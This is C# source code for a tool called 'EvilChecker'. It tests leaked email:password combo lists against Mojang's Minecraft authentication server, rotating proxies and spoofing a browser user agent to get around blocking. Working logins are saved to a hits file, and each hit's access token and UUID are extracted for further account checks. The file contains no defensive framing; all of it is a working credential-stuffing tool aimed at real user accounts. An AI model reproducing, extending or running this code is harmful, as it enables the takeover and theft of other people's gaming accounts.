using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Console = Colorful.Console;
using xNet;
using System.Drawing;
using System.IO;
using System.Diagnostics;
using System.Threading;
using EvilChecker.Minecraft_General;
namespace EvilChecker.Mojang
{
    class Minecraft_mojang
    {
        public static void MinecraftChecker()//Minecraft Checker
        {
            string proxy = "";
            int proxymode = 0;
            while (true)
            {
                Proxy.Get_Proxy_By_List(out proxy, out proxymode); ;
                string responString;
                string tempacc;
                string[] account;
                string name;
                try
                {
                    lock (MainChecker.locker1)
                    {
                        tempacc = MainChecker.comboList[MainChecker.cnum].Trim().Replace("\r", "");
                        MainChecker.cnum++;
                    }
                    account = tempacc.Split(':');
                    if (MainChecker.hit_email.Contains(account[0].Trim().ToLower()))
                    {
                        MainChecker.checkeds++;
                        continue;
                    }
                }
                catch
                {
                    MainChecker.threadnum--;
                    break;
                }
                string jsonText;
                try
                {
                    jsonText = "{\"agent\":{ \"name\":\"Minecraft\",\"version\":\"1\"},\"username\":\"" + account[0].Trim() + "\",\"password\":\"" + account[1].Trim() + "\",\"requestUser\":\"false\"}";
                }
                catch
                {
                    MainChecker.checkeds++;
                    while (true)
                    {
                        try
                        {
                            using (StreamWriter sw = new StreamWriter(MainChecker.directory + "Errors.txt", true))
                            {
                                sw.WriteLine(tempacc);
                            }
                            break;
                        }
                        catch
                        {

                        }
                    }
                    continue;
                }

                for (int a = 0; a < MainChecker.recheck; a++)
                {
                checking:
                    responString = CheckingAccount(jsonText, proxy, proxymode);

                    if (responString == "")
                    {
                        Proxy.Get_Proxy_By_List(out proxy, out proxymode);
                        goto checking;
                    }
                    else if (responString.Contains("ForbiddenOperationException"))
                    {
                        if(!responString.Contains("Invalid credentials"))
                        {
                            MainChecker.checkeds++;
                            Console.Title = "EvilChecker - Checked:" + MainChecker.checkeds.ToString() + " - All: " + MainChecker.combonum + " - Hits:" + MainChecker.hit.ToString() + " - Elapse:" + MainChecker.hour + ":" + MainChecker.minute + ":" + MainChecker.second + " - CPM:" + MainChecker.cpm + " - CurtainThreads:" + MainChecker.threadnum;
                            if (MainChecker.printall)
                            {
                                Console.WriteLine("[Bad]" + account[0] + ":" + account[1], Color.Red);
                            }
                            break;
                        }
                        if (a == MainChecker.recheck - 1)
                        {
                            MainChecker.checkeds++;
                            Console.Title = "EvilChecker - Checked:" + MainChecker.checkeds.ToString() + " - All: " + MainChecker.combonum + " - Hits:" + MainChecker.hit.ToString() + " - Elapse:" + MainChecker.hour + ":" + MainChecker.minute + ":" + MainChecker.second + " - CPM:" + MainChecker.cpm + " - CurtainThreads:" + MainChecker.threadnum;
                            if (MainChecker.printall)
                            {
                                Console.WriteLine("[Bad]" + account[0] + ":" + account[1], Color.Red);
                            }
                            break;
                        }
                        else
                        {
                            Proxy.Get_Proxy_By_List(out proxy, out proxymode);
                        }
                        Thread.Sleep(1500);
                        continue;
                    }
                    else if (responString.Contains("availableProfiles"))
                    {                        
                        name = Somemould.Getsubstring(responString, "selectedProfile\":{\"name\":\"", "\"");
                        if(name != "")
                        {
                            while (true)
                            {
                                try
                                {
                                    using (StreamWriter sw = new StreamWriter(MainChecker.directory + "Hits.txt", true))
                                    {
                                        sw.WriteLine(account[0] + ":" + account[1]);
                                    }
                                    break;
                                }
                                catch
                                {

                                }
                            }
                            MainChecker.hit_email += account[0].Trim().ToLower() + "\r\n";
                            MainChecker.checkeds++;
                            MainChecker.hit++;
                            Console.Title = "EvilChecker - Checked:" + MainChecker.checkeds.ToString() + " - All: " + MainChecker.combonum + " - Hits:" + MainChecker.hit.ToString() + " - Elapse:" + MainChecker.hour + ":" + MainChecker.minute + ":" + MainChecker.second + " - CPM:" + MainChecker.cpm + " - CurtainThreads:" + MainChecker.threadnum;
                            string token = Somemould.Getsubstring(responString, "accessToken\":\"", "\"");
                            string uuid = Somemould.Getsubstring(responString, "[{\"name\":\"" + name + "\",\"id\":\"", "\"");
                            Minecraft.Check_Minecraft_stat(account, token, name, uuid);
                            break;
                        }
                        else
                        {
                            MainChecker.checkeds++;
                            Console.Title = "EvilChecker - Checked:" + MainChecker.checkeds.ToString() + " - All: " + MainChecker.combonum + " - Hits:" + MainChecker.hit.ToString() + " - Elapse:" + MainChecker.hour + ":" + MainChecker.minute + ":" + MainChecker.second + " - CPM:" + MainChecker.cpm + " - CurtainThreads:" + MainChecker.threadnum;
                            if (MainChecker.printall)
                            {
                                Console.WriteLine("[Bad]" + account[0] + ":" + account[1], Color.Red);
                            }
                            break;
                        }
                    }
                    else if (responString.Contains("Unrecognized character escape") || responString.Contains("JsonParseException"))
                    {
                        MainChecker.checkeds++;
                        Console.Title = "EvilChecker - Checked:" + MainChecker.checkeds.ToString() + " - All: " + MainChecker.combonum + " - Hits:" + MainChecker.hit.ToString() + " - Elapse:" + MainChecker.hour + ":" + MainChecker.minute + ":" + MainChecker.second + " - CPM:" + MainChecker.cpm + " - CurtainThreads:" + MainChecker.threadnum;
                        if (MainChecker.printall)
                        {
                            Console.WriteLine("[Bad]" + account[0] + ":" + account[1], Color.Red);
                        }
                        break;
                    }
                    else
                    {
                        Proxy.Get_Proxy_By_List(out proxy, out proxymode);
                        goto checking;
                    }
                }

            }
        }
        public static void ReadOGnameList()
        {
            try
            {
                MainChecker.ognamelist = Somemould.RemoveBadLines(File.ReadAllText(Directory.GetCurrentDirectory() + "\\config\\dictionary.txt"));
                Console.WriteLine("[*]OGname Dictionary: Load " + Somemould.Getlines(MainChecker.ognamelist).ToString() + " Lines", Color.YellowGreen);
            }
            catch
            {
                Console.WriteLine("[Warn]Invaild OGnameList,OGnameChecking will be shut down", Color.Red);
                MainChecker.check_ogname = false;
            }
        }
        private static string CheckingAccount(string jsonText,string proxy,int proxymode)
        {
            string responString;
            try
            {
                using (HttpRequest http = new HttpRequest())
                {
                    http.IgnoreProtocolErrors = true;
                    http.KeepAlive = true;
                    switch (proxymode)
                    {
                        case 1:
                            break;
                        case 2:
                            http.Proxy = HttpProxyClient.Parse(proxy);
                            break;
                        case 3:
                            http.Proxy = Socks4ProxyClient.Parse(proxy);
                            break;
                        case 4:
                            http.Proxy = Socks5ProxyClient.Parse(proxy);
                            break;
                        default:
                            break;
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36");
                    responString = http.Post("https://authserver.mojang.com/authenticate", string.Concat(new string[]
                    {
                                jsonText
                    }), "application/json").ToString();
                }
            }
            catch
            {
                responString = "";
            }
            return responString;
        }
    }
}
